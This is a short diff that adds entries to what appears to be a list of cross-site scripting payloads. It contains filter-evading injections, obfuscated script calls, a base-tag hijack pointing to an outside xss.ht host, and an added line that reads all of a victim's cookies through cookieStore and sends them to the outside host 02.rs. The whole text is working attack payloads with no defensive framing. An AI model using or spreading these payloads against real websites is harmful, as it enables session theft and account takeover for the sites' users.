@@ -2,3 +2,7 @@
 "autofocus onfocus=alert(1)//
 "type%3d"text"autofocus%20onfocus%3d"alert(1)"
 %22%3E%3Cbase%20href=%22https://nithisshs.xss.ht%22%3E
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+<div id=x></div><script>Window.prototype.x.innerHTML='<img src=1 onerror=alert(1)>';</script>
+Window.prototype.__proto__.x.ownerDocument.defaultView.alert(1)</script>
+cookieStore.getAll().then(x=>fetch('//02.rs/'+JSON.stringify(x)))
